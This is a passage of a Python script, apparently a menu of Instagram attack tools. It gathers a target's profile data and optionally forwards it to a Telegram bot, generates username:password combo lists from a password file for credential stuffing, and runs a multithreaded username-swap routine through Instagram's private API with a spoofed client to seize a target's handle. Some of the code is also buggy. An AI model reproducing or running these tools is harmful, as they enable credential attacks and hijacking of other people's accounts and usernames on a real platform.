        url    = str(req_id['graphql']['user']['external_url'])
        nam    = str(req_id['graphql']['user']['full_name'])
        idd    = str(req_id['graphql']['user']['id'])
        isp    = str(req_id['graphql']['user']['is_private'])
        isv    = str(req_id['graphql']['user']['is_verified'])
        pro    = str(req_id['graphql']['user']['profile_pic_url'])
        print(Y+"==================================")
        print(G+f'n[-] Name : {nam}\n[-] Id : {idd}\n[-] private : {isp}\n[-] verified : {isv}\n[-] Bio : {bio}\n[-] Profile picture : {pro}')
        print(Y+"==================================")
        ask = input(Y+'[+] Send To Telegram [y/n] >> ')
        if ask == "y":
            print(' ')
            ID = input('[+] Enter Telegram ID : ')
            token = input('[+] Enter Token Bot Telegram : ')
            Account = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=❖ \n❖ Name : {nam}\n❖ Id : {idd}\n❖ private : {isp}\n❖ verified : {isv}\n❖ Bio : {bio}\n❖ Profile picture : {pro}'
            r.get(Account)
            print(f'[-] Done Send Msg to >> {ID}')
            print(Style.RESET_ALL)
        else:
            print(Style.RESET_ALL)
            pass
    if tools == '5':
        banner = (G+"""
        
  ___ ____    ____                _           
 |_ _/ ___|  / ___|___  _ __ ___ | |__   ___  
  | | |  _  | |   / _ \| '_ ` _ \| '_ \ / _ \ 
  | | |_| | | |__| (_) | | | | | | |_) | (_) |
 |___\____|  \____\___/|_| |_| |_|_.__/ \___/ 
                                              

        """)
        print(banner)
        print('==========================')
        chars    = 'abcdefghijklmnopqrstuvwxyz1234567890'
        username = int(input(Y+'[+] Enter User lenth : '))
        comboo   = int(input("[+] Enter combo length : "))
        password = open("pass.txt",'r').read().splitlines()
        l = 0
        while l <= comboo:
            user = str(''.join(random.choice(chars) for i in range(username)))
            with open("Combo.txt",'a') as wr:
                wr.write(user+":"+random.choice(password)+'\n')
                wr.close()
                l += 1
                if l == comboo:
                    print(Y+f'[-] Done Make Combo List')
                    try:
                        print(str(x[0]))
                    except:
                        pass
                    print(Style.RESET_ALL)
                    sleep(3)
    if tools == '6':
        def close():
            global Y
            input(Y+'[+] Enter To Close » ')
            print(Style.RESET_ALL)
            quit()
        req = requests.session()
        banner = (G+"""
        
  ___ ____   ____                     
 |_ _/ ___| / ___|_      ____ _ _ __  
  | | |  _  \___ \ \ /\ / / _` | '_ \ 
  | | |_| |  ___) \ V  V / (_| | |_) |
 |___\____| |____/ \_/\_/ \__,_| .__/ 
                               |_|    

        """)
        print(banner)
        print('==========================')
        username = input(Y+'[+] Enter UserName : ')
        password = input('[+] Enter Password : ')
        try:
            print(str(x[0]))
        except:
            pass
        url = 'https://i.instagram.com/api/v1/accounts/login/'

        headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            'Host': 'i.instagram.com',
            'Connection': 'keep-alive'
        }
        data = {
            'uuid': uid,
            'password': password,
            'username': username,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'
        }

        r1 = req.post(url, headers=headers, data=data)
        Cookies = r1.cookies
        loginJS = r1.json()
        def login():
            global G
            try:
                if 'logged_in_user' in r1.text:
                    print(G+'[!] Login Done')
                    pass
                else:
                    if 'challenge_required' in r1.text:
                        print('[!] Account Is Secure')
                        close()
                    else:
                        if 'two_factor_required' in r1.text:
                            print('[!] Two Factor required')
                            close()
                        else:
                            print('[!] Error Information')
                            close()
            except:
                print('[!] Make sure you are connected to the internet and try again')
                close()

        login()
        target = input('[+] Enter User Target : ')
        ask = input('[+] Ready [y/n] » ' )
        if ask == 'y':
            pass
        else:
            close()
        editurl = 'https://i.instagram.com/api/v1/accounts/edit_profile/'
        editdata = {
            '_uuid': uid,
            '_uid': uid,
            'csrftoken': 'missing',
            'first_name': '',
            'is_private': 'false',
            'phone_number': '',
            'biography': 'Swapped By @O0Dev & @nqvc' ,
            'username': target,
            'gender': '',
            'email': 'nqvc@instagram.ch',
            'external_url': ''}

        x = 0
        def swap():
            global x
            while True:
                r2 = req.post(editurl, headers=headers, data=editdata, cookies=Cookies).status_code
                x += 1
                if r2 == 200:
                    print(f'[-] Swapped Done » @{target} ')
                    sleep(5)
                    break
                elif r2 == 400:
                    print(f'[!] Watting to swap » {target} {x}')
                elif re == 429:
                    print('[!] Account Blocked')
                    break
        for x in range(25):
            t = threading.Thread(target=swap)
            t.start()
